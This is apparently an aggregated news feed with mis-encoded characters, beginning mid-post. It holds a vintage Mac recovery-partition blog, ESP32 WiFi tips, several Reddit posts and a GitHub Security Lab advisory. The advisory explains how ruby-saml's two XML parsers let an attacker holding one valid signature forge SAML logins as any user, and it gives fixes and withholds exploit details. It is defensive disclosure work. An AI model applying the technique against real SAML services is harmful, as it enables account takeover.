Startup Items folder contains the Read Me application:Everything started to become clear. The recovery app was marked as the startup application instead of the Finder. It displayed the dialog giving the user the option to recover. If they clicked OK, it would copy the entire System Folder from the Recovery Volume, omitting itself, to the Desktop Folder of the main hard drive partition. Then, it would â€œblessâ€ the newly-copied mini System Folder and reboot.How did all this stuff get into the partition? Did Apple Backup do it, or was it factory-programmed data? I tried to see if I could deduce anything from the dates of the files. In order to preserve the integrity of all of the displayed dates, I performed this analysis with a read-only copy of the original drive image in order to prevent any modification dates from being updated.All of the files in the partition have a creation date of March 4, 1994 â€” over 31 years ago! Most of the files have a matching modification date, except for the System suitcase, which was last modified on September 26, 1994. I donâ€™t know exactly what this all means, considering it came from a machine with a January 1994 manufacture date.The Recovery Volume itself also has a creation date of March 4th, just five minutes before the creation date of all the files. Interestingly, the modification date of the volume is still shown as March 4th in the Get Info window, even though the System suitcase was modified later in September of that year.The Master Directory Block of the Recovery Volume says the modification date (drLsMod) is September 26th, matching when the System file was changed. Iâ€™m not sure what causes this discrepancy. I guess the date displayed in the Get Info window isnâ€™t simply the date stored in the Master Directory Block.Similarly, although the main hard drive partition has a creation date of December 5, 1993 according to the Master Directory Block, the Get Info window says it was created on February 3, 1994. Iâ€™m not sure which one is more accurate. Either way, itâ€™s pretty clear this drive had not been reformatted. I did find it curious that the recovery partition was created over a month later, though. When you reformat a hard drive using the special version of Apple HD SC Setup on the Performa CD, the recovery partition ends up with a creation date about a minute after the main partition.The Finder and System Enablers in the recovery partition are identical to the same stock files from a 7.1P6 restore. The only difference I could find in the System file was that the recovery partitionâ€™s version was missing a single At Ease â€˜INITâ€™ resource, but the At Ease Startup extension automatically adds it to the System file after you reboot. This leaves you with a System file totally identical to what is restored from the Performa CD. I find it odd that At Ease was stripped out, but the American Heritage Dictionary â€˜FKEYâ€™ resource was not.The best theory that I can come up with is that Apple Backup really was responsible for creating this partition. After all, Apple went out of their way to specifically mention it in their tech note. Maybe March 4th, 1994 was the date when the original owner of the computer backed it up for the first time. September 26th could have been the last time that Apple Backup was run. Perhaps the owner completely uninstalled At Ease from the computer between March and September, so the System file had been changed and the recovery copy needed to be updated accordingly? Unfortunately, most of the Performa-specific software had been deleted from this computer. It was still running System 7.1P6, but Apple Backup was nowhere to be found. So I wasnâ€™t able to confirm whether or not a mysterious, unpreserved newer version of Apple Backup was really responsible for populating the partition.The other theory floating around in my head is that maybe it came from the factory like this. The March 1994 timeline is consistent with the date of the tech note describing the functionality, so maybe thatâ€™s when Apple created it and started bundling it. I donâ€™t know how long the machines sat at Appleâ€™s factory before they were actually sold â€” does a manufacture date of January 1994 also mean it was shipped to a store in January 1994? Either way, I definitely donâ€™t know how to explain the September 26th, 1994 modification date. Maybe a third-party utility did something to the System file on the secondary partition? The first Apple Backup theory seems like the more likely explanation, especially given that Apple said thatâ€™s how it was created.This whole question is the last piece of the puzzle that hasnâ€™t been solved yet. If anyone else has a Performa 550 and would be willing to dump their hard drive or at least look at Apple Backup, Iâ€™d be very interested in finding out A) if it has the recovery partition and B) if there was a special newer version of Apple Backup that didnâ€™t make its way onto the Performa CD. I searched for various strings that show up in the â€œrecoveryâ€ and â€œRead Me Mini System Folderâ€ apps, and they arenâ€™t anywhere on the Performa CD. I guess they could be stored compressed somewhere, but Iâ€™m pretty confident based on the actual Apple Backup code that nothing is hiding in there. Here are the various versions (with their exact sizes and dates) of Apple Backup that I have seen on Performa 550 installations. None of these have the recovery partition creation built in:I also found version 1.3 (June 15, 1994, 163,388 bytes used) by restoring from a Performa 636 restore CD. It, too, does not contain any recovery partition code.For a demo, I thought it would be fun to replicate the problem that the Apple tech note mentioned about the Dinosaur Safari CD inadvertently activating the recovery partition, so I bought a copy to test it out. To make it even more interesting, I decided to run this test on real hardware. Iâ€™m leaning toward believing that a lot of the older caddy-loading models (possibly all of them) didnâ€™t have this recovery partition, so just pretend itâ€™s a newer model that came with System 7.1P6. I copied the recovery partition onto a real Apple-branded IBM 160 MB SCSI hard drive using ZuluSCSIâ€™s USB MSC initiator mode, which allows it to act as a USB-to-SCSI bridge. Sorry about the flickery screen; I couldnâ€™t get my phone cameraâ€™s shutter speed to sync up perfectly with the displayâ€™s refresh rate.Sure enough, when I opened the game from the CD, the computer did exactly what Appleâ€™s tech note said it would do. The workaround of copying the application to my hard drive worked just fine. If itâ€™s not obvious, I sped up the process of copying it to the hard drive â€” it took a while! It might be interesting someday to look into why this game accidentally activated the OS recovery, but this blog is already getting way too long!I want to talk a little more about the yellow screen of shame. When I first saw it, I wasnâ€™t entirely sure if it was really part of the recovery functionality or if the original owner just had terrible taste.Digging deeper, I found three clues that all made it clear it was an intentional choice by Apple to really make it obvious that something was wrong. First, the yellow pattern is stored as a â€˜ppatâ€™ resource in the recovery app.Second, the System file in the recovery partition has the default blue-gray Performa background shown in the screenshots above. This makes sense, because itâ€™s the pattern that showed up with the dialog about the Performa having trouble starting up.And lastly, page 3 of the Read Me app implies that something may have changed your desktop pattern.So clearly, the recovery process, by design, sets up the custom yellow background.Why did I care so much about finding this lost partition? Well, there are a number of reasons. For one, this is exactly the kind of research project thatâ€™s perfect for me because I donâ€™t know how to let things go. Itâ€™s also something that, quite frankly, needed to be preserved before it became extinct. The most important reason, though, is that this functionality is historically significant and deserves some attention. How many personal computers in 1994 still had the ability to boot after the OS was trashed? Isnâ€™t this an extremely early example of this type of functionality? Did Windows have anything like this prior to Vista? Did the Mac have anything else like this prior to sometime in the OS X era? I would love to hear more comments about what you think on this. I admittedly donâ€™t know a ton about older machines that werenâ€™t Macs.Iâ€™m not saying this feature is perfect. Since weâ€™ve already seen that the Dinosaur Safari CD was able to accidentally activate it, I wouldnâ€™t be surprised if there were other ways to inadvertently cause it to pop up too. It also required manual intervention after the recovery process, which meant that you needed a fair amount of computer knowledge to finish fixing your OS. The average Joe Schmoe would probably have trouble following these directions to fix the System Folder. But still, it leaves you with a bootable system instead of an unusable computer with a flashing question mark. Itâ€™s very cool, especially for 1994.I wonder why Apple didnâ€™t continue down this path with subsequent models? Or even retroactively adding the functionality to earlier ones after a fresh install of a newer OS. Iâ€™m not aware of any other Macs that have this partition. It doesnâ€™t depend on any special ROM support or anything like that, at least as far as I can see. I tried out the recovery functionality on several other machines: a IIci, LC, LC 475, and an emulated Performa 600, and it works great on all of them. Heck, it even works on the Classic II/Performa 200!It kind of looks like the window size of the Read Me app was a calculated decision to ensure it would fit on the 512Ã—342 screen used in black-and-white compact Macs.Thinking about later models, the Performa 630 series used an internal IDE hard drive instead of SCSI, so the custom version of Apple HD SC Setup was no longer used. I wonder if the Performa 57x series had this partition? Youâ€™d think they would have had the exact same software bundle as the tray-loading 550 models. If any readers have a Performa 57x machine, Iâ€™d greatly appreciate it if you could check!How did this functionality actually work under the hood? I havenâ€™t gone too deep into the code (maybe it can be a future post), but I have pieced together a few clues. The â€œmsjyâ€ magic number I talked about earlier definitely plays a part in everything. The special Performa version of Apple HD SC Setup also includes a custom version of Appleâ€™s hard disk driver. This driver contains several references to msjy, so Iâ€™m pretty sure thatâ€™s what it uses to identify the recovery partition.I also discovered that the 7.1P4 and 7.1P5 Utilities floppy disks, which were bundled with various Performas, have slightly older custom versions of Apple HD SC Setup: 7.2.1P and 7.2.2P respectively. They also create the recovery partition. The interesting thing about these versions is that it appears Apple accidentally forgot to strip out the debug function names, in both the utility itself and the bundled hard disk driver. They didnâ€™t make this mistake in the original non-Performa 7.2.2 version, and they also didnâ€™t make the mistake in the newer 7.2.2P6 version. Anyway, this is kind of cool, because it tells me the names of functions that look for â€œmsjyâ€ at an offset of 0x9C. Function names in that same area of the driver code include: , , , , and . So Apple definitely at least sort of released some of the recovery functionality to the public prior to 7.1P6, despite what their own version history says. And the disk driver is definitely involved in it.Newer versions of Appleâ€™s disk driver no longer contain the magic number, so at some point they must have abandoned this functionality. In my opinion, itâ€™s a real shame that they ditched it â€” this could have been very useful going forward on all Macs. They could have even expanded on it and automated more of the recovery process. Sure, it used some of your hard drive space, but it could have been a good trade-off for better reliability.Thatâ€™s more than enough technical stuff for one post. I am sharing a download link where you can try this functionality out for yourself if you want. After all, the whole reason I did this was for software preservation purposes, so it makes sense to share it with the world. This is a small piece of Apple software history that, to my knowledge, has not been preserved until now. I uploaded a drive image to the Macintosh Garden. Donâ€™t worry, I didnâ€™t include any of the original ownerâ€™s personal data. I started fresh with a blank hard drive image, restored it using the 7.1P6 Performa CD, and then only copied over the restore partition from the dumped hard drive. So this is a factory-fresh Performa 550 7.1P6 install with the recovery partition also present and populated.The MAME command that I use to boot from this disk image is:Of course, you can also test it out on a real machine by copying the hard drive image to a ZuluSCSI or BlueSCSI and naming it something like HD00.hda.Winding down this super long post now, the main lessons I learned from this research project are:If you get your hands on a vintage computer, strongly consider backing the hard drive up before erasing it. I know it might contain someoneâ€™s personal files, so be mindful of that, and of course respect their privacy. But there might still be something hiding in the background that has been lost to time. You never know â€” it happened here!The fact that many hard drives go bad as they age might actually be a good thing for software preservation. If a vintage computerâ€™s hard drive has a stuck head that can easily be bypassed, someone might sell it as non-working with data intact, rather than erasing it and selling it as â€œfully tested and wipedâ€.There are some really awesome people out there in the world!Special thanks to Pierre for discovering that this functionality even existed in the first place, and getting the word out so we could eventually preserve it. I also have to thank David Pogue and Joseph Schorr for writing about it in their book many decades ago. And of course, huge thanks to the amazing person from Reddit, who asked not to be credited, who gave me the opportunity to borrow and repair the drive that ended up containing the lost partition. Youâ€™re seriously the best!Iâ€™m going to repeat this again in case anybody has scrolled all the way to the end. There are still missing pieces of knowledge about how exactly this recovery partition would have been originally created. If you happen to have a Performa 550 with its original hard drive and wouldnâ€™t mind checking for the partition and/or a special version of Apple Backup, please let me know! I would be happy to walk anybody through the process of dumping the drive contents. Iâ€™ll send you something if you donâ€™t have the equipment needed to dump a hard drive. Even if the machine has been upgraded to System 7.5 or Mac OS 7.6, itâ€™s still fine â€” everything could very well still be there, lurking in the background.]]></content:encoded></item><item><title>ESP32 WiFi Superstitions</title><link>https://supakeen.com/weblog/esp32-wifi-superstitions/</link><author>supakeen</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 23:12:08 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[The ESP32 is a popular microcontroller to use for do-it-yourself home automation, sensors, and a variety of other bits and bobs that you might want to take care of around the house. Itâ€™s the successor to the venerable ESP8266 which has found its way into many of our WiFi connected devices (seriously, open up a device and chances are relatively large that youâ€™ll find one).After having done quite a few projects based on the ESP32 in the Arduino and esp-idf frameworks I did start to notice some pecularities with my deployed devices (fancy wording for the one in my electrical cabinet thatâ€™s  to send the electrical usage data somewhere and a hodgepodge of sensor boards around the house, mostly the Snuffelaar by Sebastius with firmware written by Juerd).It seemed some of my ESP32 based boards were regularly losing connectivity. Initially my thoughts went out to the terrible power supplies I was using to run them (the cheapest of the cheap USB power supplies that came with a variety of accessories around my house). After switching these out for some more accessible and probably better quality tested Ikea chargers the problems, however, persisted.Asking around for experience from others at RevSpace, my local hackerspace, seemed to indicate that people had seen similar things with their ESP32-based projects. But not everyone had these issues. Slowly I started gathering more and more â€œsuperstitionsâ€ around how to keep these microcontrollers connected to my internet. Here are my favorite ones, I have applied all of these and while I havenâ€™t tested them one-by-one the combination of them has ensured steady connections on my SSIDs.While these workarounds donâ€™t quite come close to placing a hexagon of CR2023 batteries around your ESP32 while you chant the 802.11ax specification at it, they have no basis in any  research I did. Take these as anecdotal workarounds for ESP32â€™s losing connectivity to your WiFi.Turn off power saving on the ESP32The ESP8266 never had any power saving for its WiFi modem stack, however the ESP32 . To me this is the most likely culprit in that in some network configurations, perhaps in combination with some radios, the power saving does something that makes it stop interacting with the network.In your personal handcrafted firmware you can use the following, which should work in esp-idf  Arduino (from what Iâ€™ve been told):For ESPHome based projects you can add:Set your APs to use 20 Mhz wide channelsIf you have fancy network hardware then you can likely configure the channel width for the network that serves your ESP32â€™s. From what people and the internet tell me you  set the band width on the 2.4 Ghz network that your boards use to , not 40, not 60, and definitely not automatic.Pin your ESP32â€™s to a single APIt seems that when an ESP32 connects it goes straight for the first access point it sees. No matter if that access point is not the one youâ€™ve taped it to. This can lead to bad connectivity, especially since Iâ€™ve not really observed ESP32â€™s moving around to other access points. If your network hardware allows it, you should pin the device to the closest one.These urban legends have so far made it seem that at least my problems are ghosts of the past. I havenâ€™t had a device drop from the network in about a week or two now while they used to drop multiple times per day. Iâ€™m planning to drop my application level keep-alives (still a good idea, Iâ€™ll write about them another time) because they seem to not be necessary at all anymore.I hope these are of help to anyone, and that the spirits of the ESP32 deem your network worthy too.]]></content:encoded></item><item><title>Deploying Local Kubernetes Cluster with Terraform &amp; KVM</title><link>https://www.reddit.com/r/kubernetes/comments/1jc7np0/deploying_local_kubernetes_cluster_with_terraform/</link><author>/u/rached2023</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sat, 15 Mar 2025 23:06:58 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I'm trying to deploy a local Kubernetes cluster (1 master & 2 workers) using Terraform on KVM-based virtual machines. However, when I run , I keep encountering the following error: â”‚ interrupted - last error: SSH authentication failed : ssh: handshake failed: ssh: unable to authenticate, attempted methods [none publickey], no supported â”‚ methods remainand this is my code for ssh : variable "ssh_private_key" { default = "/home/rached/.ssh/id_rsa" type = string } connection { type = "ssh" user = var.ssh_user password = var.ssh_password # The password for SSH authentication private_key = file(var.ssh_private_key) host = each.key == "master1" ? "192.168.122.6" : (each.key == "worker1" ? "192.168.122.197" : "192.168.122.184") timeout = "5m" I have already: âœ… Checked SSH key permissions âœ… Verified that the public key is added to the VM âœ… Confirmed that SSH is enabled on the VMHas anyone faced a similar issue? Any insights or troubleshooting steps would be greatly appreciated!]]></content:encoded></item><item><title>Linux in Furniture Store</title><link>https://www.reddit.com/r/linux/comments/1jc76ce/linux_in_furniture_store/</link><author>/u/S4ndwichGurk3</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 22:43:47 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I was amazed today and have to share this.I was in a large furniture store today in Germany and asked an employee about my online order. She went to the PC and I noticed that it runs Linux. It looked like an older version of KDE. Okay, Linux might be getting more popular for such use-cases, if I had a company like this I would also use Linux, so maybe not that special.But what really amazed me was their software. It is as simple as it gets: a TUI with green text and black background, no mouse input, all done by keyboard, navigating around, entering in some numbers, and within seconds she printed something for me.It reminded me of an opposite example at my health insurance provider, where she had to click and move the mouse for 5 minutes until she printed what I needed.]]></content:encoded></item><item><title>duck: disk usage analysis tool with an interactive command line interface</title><link>https://www.reddit.com/r/linux/comments/1jc6ipp/duck_disk_usage_analysis_tool_with_an_interactive/</link><author>/u/KryXus05</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 22:12:13 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[   submitted by    /u/KryXus05 ]]></content:encoded></item><item><title>PSA: ðŸŒ‡ async-std has been officially discontinued; use smol instead</title><link>https://crates.io/crates/async-std</link><author>/u/JoshTriplett</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sat, 15 Mar 2025 22:09:14 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>best way to integrate argocd and hashicorp vault</title><link>https://www.reddit.com/r/kubernetes/comments/1jc4ise/best_way_to_integrate_argocd_and_hashicorp_vault/</link><author>/u/Existing-Mirror2315</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sat, 15 Mar 2025 20:35:50 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[   submitted by    /u/Existing-Mirror2315 ]]></content:encoded></item><item><title>TracePerf: TypeScript-Powered Node.js Logger That Actually Shows You What&apos;s Happening</title><link>https://github.com/thelastbackspace/traceperf</link><author>/u/shubhwadekar</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 20:33:48 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>I implemented my own regex engine in Go</title><link>https://github.com/bogdan-deac/regex</link><author>/u/Constant_Apple_577</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 20:18:30 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Automata theory and formal languages always seemed cool to me, so I decided to implement my own regexes. It's just a toy project but I had a lot of fun doing it so far and I'll see how far I can take it.]]></content:encoded></item><item><title>A Simple Linux Desktop for People with Cognitive Decline â€“ Where to Start?</title><link>https://www.reddit.com/r/linux/comments/1jc3mfs/a_simple_linux_desktop_for_people_with_cognitive/</link><author>/u/Important-Ad2632</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 19:55:45 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I have this idea that might be a bit far-fetched, and even though Iâ€™ve used Linux for years, Iâ€™m not really sure where to start.The Background My dad was diagnosed with dementia over a year ago. While heâ€™s still able to think clearly in many ways, his ability to use technology has taken a hit. He only got into computers and smartphones later in life, and now, with so much of society relying on digital toolsâ€”whether itâ€™s banking, doctor appointments, or even just staying in touchâ€”heâ€™s struggling.Where I live, we even have a government-issued two-factor authentication device/app thatâ€™s required for almost everything. Itâ€™s frustrating for him, and Iâ€™ve seen firsthand how technology, which should be making life easier, is actually making him feel more isolated. And letâ€™s be realâ€”this reliance on tech is only going to increase.The Idea Iâ€™d love to create an ultra-simple Linux desktop tailored for people like my dad. Something that: â€¢ Boots straight into a locked-down, minimal desktop. â€¢ Has only a few essential programs, like a web browser, email client, or video calling app. â€¢ Allows relatives to configure everything through an admin panel setting bookmarks, fixing icons, and keeping things simple. â€¢ Runs on familiar hardware, since Linux makes it easy to install on existing devices with a USB.This would be a passion project. I just see a real need for it, and Iâ€™m sure it could help a lot of people.My Question Iâ€™m not planning on touching kernel code or diving into low-level OS development. I have some programming experience (mostly in data engineering and data science), but I donâ€™t even know where to start researching a project like this. What tools or frameworks should I look into? Are there existing Linux distros or desktop environments that could be adapted for this purpose?I know this wonâ€™t be ready in time to help my dad, but Iâ€™d still love to explore the idea. Any pointers would be appreciated!Even if I drop the project along the way I still get to learn something new about Linux ]]></content:encoded></item><item><title>Sign in as anyone: Bypassing SAML SSO authentication with parser differentials</title><link>https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/</link><author>campuscodi</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 19:06:01 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Critical authentication bypass vulnerabilities (CVE-2025-25291 + CVE-2025-25292) were discovered in ruby-saml up to version 1.17.0. Attackers who are in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization can use it to construct SAML assertions themselves and are in turn able to log in as any user. In other words, it could be used for an account takeover attack. Users of ruby-saml should update to version 1.18.0. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml.In this blog post, we detail newly discovered authentication bypass vulnerabilities in the ruby-saml library used for single sign-on (SSO) via SAML on the service provider (application) side. GitHub doesnâ€™t currently use ruby-saml for authentication, but began evaluating the use of the library with the intention of using an open source library for SAML authentication once more. This library is, however, used in other popular projects and products. We discovered an exploitable instance of this vulnerability in GitLab, and have notified their security team so they can take necessary actions to protect their users against potential attacks.GitHub previously used the ruby-saml library up to 2014, but moved to our own SAML implementation due to missing features in ruby-saml at that time. Following bug bounty reports around vulnerabilities in our own implementation (such as CVE-2024-9487, related to encrypted assertions), GitHub recently decided to explore the use of ruby-saml again. Then in October 2024, a blockbuster vulnerability dropped: an authentication bypass in ruby-saml (CVE-2024-45409) by ahacker1. With tangible evidence of exploitable attack surface, GitHubâ€™s switch to ruby-saml had to be evaluated more thoroughly now. As such, GitHub started a private bug bounty engagement to evaluate the security of the ruby-saml library. We gave selected bug bounty researchers access to GitHub test environments using ruby-saml for SAML authentication. In tandem, the GitHub Security Lab also reviewed the attack surface of the ruby-saml library.As is not uncommon when multiple researchers are looking at the same code, both ahacker1, a participant in the GitHub bug bounty program, and I noticed the same thing during code review: ruby-saml was using two different XML parsers during the code path of signature verification. Namely, REXML and Nokogiri. While REXML is an XML parser implemented in pure Ruby, Nokogiri provides an easy-to-use wrapper API around different libraries like libxml2, libgumbo and Xerces (used for JRuby). Nokogiri supports parsing of XML and HTML. It looks like Nokogiri was added to ruby-saml to support canonicalization and potentially other things REXML didnâ€™t support at that time.We both inspected the same code path in the  of  and found that the signature element to be verified is first read via REXML, and then also with Nokogiriâ€™s XML parser. So, if REXML and Nokogiri could be tricked into retrieving different signature elements for the same XPath query it might be possible to trick ruby-saml into verifying the wrong signature. It looked like there could be a potential authentication bypass due to a !The reality was actually more complicated than this.Roughly speaking, four stages were involved in the discovery of this authentication bypass:Discovering that two different XML parsers are used during code review.  Establishing if and how a parser differential could be exploited.  Finding an actual parser differential for the parsers in use.  Leveraging the parser differential to create a full-blown exploit.To prove the security impact of this vulnerability, it was necessary to complete all four stages and create a full-blown authentication bypass exploit.Quick recap: how SAML responses are validatedSecurity assertion markup language (SAML) responses are used to transport information about a signed-in user from the identity provider (IdP) to the service provider (SP) in XML format. Often the only important information transported is a username or an email address. When the HTTP POST binding is used, the SAML response travels from the IdP to the SP via the browser of the end user. This makes it obvious why there has to be some sort of signature verification in play to prevent the user from tampering with the message.Letâ€™s have a quick look at what a simplified SAML response looks like:Note: in the response above the XML namespaces were removed for better readability.As you might have noticed: the main part of a simple SAML response is its assertion element (A), whereas the main information contained in the assertion is the information contained in the  element (B) (here the NameID containing the username: admin). A real assertion typically contains more information (e.g.  and  dates as part of a  element.)Normally, the  (A) (without the whole  part) is canonicalized and then compared against the  (C) and the  (D) is canonicalized and verified against the  (E). In this sample, the assertion of the SAML response is signed, and in other cases the whole SAML response is signed.Searching for parser differentialsWe learned that ruby-saml used two different XML parsers (REXML and Nokogiri) for validating the SAML response. Now letâ€™s have a look at the verification of the signature and the digest comparison.
The focus of the following explanation lies on the  method inside of .Inside that method, thereâ€™s a broad XPath query with REXML for the first signature element inside the SAML document:sig_element = REXML::XPath.first(
  @working_copy,
  "//ds:Signature",
  {"ds"=>DSIG}
)
Hint: When reading the code snippets, you can tell the difference between queries for REXML and Nokogiri by looking at how they are called. REXML methods are prefixed with , whereas Nokogiri methods are called on .Later, the actual  is read from this element:base64_signature = REXML::XPath.first(
  sig_element,
  "./ds:SignatureValue",
  {"ds" => DSIG}
)
signature = Base64.decode64(OneLogin::RubySaml::Utils.element_text(base64_signature))
Note: the name of the  element might be a bit confusing. While it contains the actual signature in the  node it also contains the part that is actually signed in the  node. Most importantly the  element contains the digest (hash) of the assertion and information about the used key.So, an actual  element could look like this (removed namespace information for better readability):<Signature>
    <SignedInfo>
        <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
        <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" />
        <Reference URI="#_SAMEID">
            <Transforms><Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /></Transforms>
            <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" />
            <DigestValue>Su4v[..]</DigestValue>
        </Reference>
    </SignedInfo>
    <SignatureValue>L8/i[..]</SignatureValue>
    <KeyInfo>
        <X509Data>
            <X509Certificate>MIID[..]</X509Certificate>
        </X509Data>
    </KeyInfo>
</Signature>
Later in the same method () thereâ€™s again a query for the Signature(s)â€”but this time with Nokogiri.noko_sig_element = document.at_xpath('//ds:Signature', 'ds' => DSIG)
Then the  element is taken from that signature and canonicalized:noko_signed_info_element = noko_sig_element.at_xpath('./ds:SignedInfo', 'ds' => DSIG)

canon_string = noko_signed_info_element.canonicalize(canon_algorithm)
Letâ€™s remember this  contains the canonicalized  element.The  element is then also extracted with REXML: signed_info_element = REXML::XPath.first(
        sig_element,
        "./ds:SignedInfo",
        { "ds" => DSIG }
 )
From this  element the  node is read:ref = REXML::XPath.first(signed_info_element, "./ds:Reference", {"ds"=>DSIG})
reference_nodes = document.xpath("//*[@ID=$id]", nil, { 'id' => extract_signed_element_id })
The method extract_signed_element_idextracts the signed element id with help of REXML. From the previous authentication bypass (CVE-2024-45409), thereâ€™s now a check that only one element with the same ID can exist.The first of the  is taken and canonicalized:hashed_element = reference_nodes[0][..]canon_hashed_element = hashed_element.canonicalize(canon_algorithm, inclusive_namespaces)
The  is then hashed:hash = digest_algorithm.digest(canon_hashed_element)
The  to compare it against is then extracted with REXML:encoded_digest_value = REXML::XPath.first(
        ref,
        "./ds:DigestValue",
        { "ds" => DSIG }
      )
digest_value = Base64.decode64(OneLogin::RubySaml::Utils.element_text(encoded_digest_value))
Finally, the  (built from the element extracted by Nokogiri) is compared against the  (extracted with REXML):unless digests_match?(hash, digest_value)
The  extracted some lines ago (a result of an extraction with Nokogiri) is later verified against (extracted with REXML).unless cert.public_key.verify(signature_algorithm.new, signature, canon_string)
In the end, we have the following constellation:The assertion is extracted and canonicalized with Nokogiri, and then hashed. In contrast, the hash against which it will be compared is extracted with REXML.  The SignedInfo element is extracted and canonicalized with Nokogiri - it is then verified against the SignatureValue, which was extracted with REXML.Exploiting the parser differentialThe question is: is it possible to create an XML document where REXML sees one signature and Nokogiri sees another?Ahacker1, participating in the bug bounty, was faster to produce a working exploit using a parser differential. Among other things, ahacker1 was inspired by the XML roundtrips vulnerabilities published by Mattermostâ€™s Juho ForsÃ©n in 2021.Not much later, I produced an exploit using a different parser differential with the help of Trail of Bitsâ€™ Ruby fuzzer called ruzzy.Both exploits result in an authentication bypass. Meaning that an attacker, who is in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization, can use it to construct assertions for any users which will be accepted by ruby-saml. Such a signature can either come from a signed assertion or response from another (unprivileged) user or in certain cases, it can even come from signed metadata of a SAML identity provider (which can be publicly accessible).An exploit could look like this. Here, an additional Signature was added as part of the  element that is only visible to Nokogiri:The  element (A) from the signature that is visible to Nokogiri is canonicalized and verified against the  (B) that was extracted from the signature seen by REXML.The assertion is retrieved via Nokogiri by looking for its ID. This assertion is then canonicalized and hashed (C). The hash is then compared to the hash contained in the  (D). This DigestValue was retrieved via REXML. This DigestValue has no corresponding signature.So, two things take place:A valid SignedInfo with DigestValue is verified against a valid signature. (which checks out)  A fabricated canonicalized assertion is compared against its calculated digest. (which checks out as well)This allows an attacker, who is in possession of a valid signed assertion for any (unprivileged) user, to fabricate assertions and as such impersonate any other user.Check for errors when using NokogiriParts of the currently known, undisclosed exploits can be stopped by checking for Nokogiri parsing errors on SAML responses. Sadly, those errors do not result in exceptions, but need to be checked on the  member of the parsed document:doc = Nokogiri::XML(xml) do |config|
  config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
end

raise "XML errors when parsing: " + doc.errors.to_s if doc.errors.any?
While this is far from a perfect fix for the issues at hand, it renders at least one exploit infeasible.We are not aware of any reliable indicators of compromise. While weâ€™ve found a potential indicator of compromise, it only works in debug-like environments and to publish it, we would have to reveal too many details about how to implement a working exploit so weâ€™ve decided that itâ€™s better not to publish it. Instead, our best recommendation is to look for suspicious logins via SAML on the service provider side from IP addresses that do not align with the userâ€™s expected location.SAML and XML signatures:as confusing as it getsSome might say itâ€™s hard to integrate systems with SAML. That might be true. However, itâ€™s even harder to write implementations of SAML using XML signatures in a secure way. As others have stated before: itâ€™s probably best to disregard the specifications, as following them doesnâ€™t help build secure implementations.
To rehash how the validation works if the SAML assertion is signed, letâ€™s have a look at the graphic below,  depicting a simplified SAML response. The assertion, which transports the protected information, contains a signature. Confusing, right?To complicate it even more: What is even signed here? The whole assertion? No!Whatâ€™s signed is the  element and the  element contains a . This  is the hash of the canonicalized assertion with the signature element removed before the canonicalization. This two-stage verification process can lead to implementations that have a disconnect between the verification of the hash and the verification of the signature. This is the case for these Ruby-SAML parser differentials: while the hash and the signature check out on their own, they have no connection. The hash is actually a hash of the assertion, but the signature is a signature of a different  element containing another hash. What you actually want is a direct connection between the hashed content, the hash, and the signature. (And once the verification is done you only want to retrieve information from the exact part that was actually verified.) Or, alternatively, use a less complicated standard to transport a cryptographically signed username between two systems - but here we are.In this case, the library already extracted the  and used it to verify the signature of its canonicalized string,. However, it did not use it to obtain the digest value. If the library had used the content of the already extracted  to obtain the digest value, it would have been secure in this case even with two XML parsers in use.As shown once again: relying on two different parsers in a security context can be tricky and error-prone. That being said: exploitability is not automatically guaranteed in such cases. As we have seen in this case, checking for Nokogiri errors could not have prevented the parser differential, but could have stopped at least one practical exploitation of it.The initial fix for the authentication bypasses does not remove one of the XML parsers to prevent API compatibility problems. As noted, the more fundamental issue was the disconnect between verification of the hash and verification of the signature, which was exploitable via parser differentials. The removal of one of the XML parsers was already planned for other reasons, and will likely come as part of a major release in combination with additional improvements to strengthen the library. If your company relies on open source software for business-critical functionality, consider sponsoring them to help fund their future development and bug fix releases.If youâ€™re a user of ruby-saml library, make sure to update to the latest version, 1.18.0, containing fixes for CVE-2025-25291 and CVE-2025-25292. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of 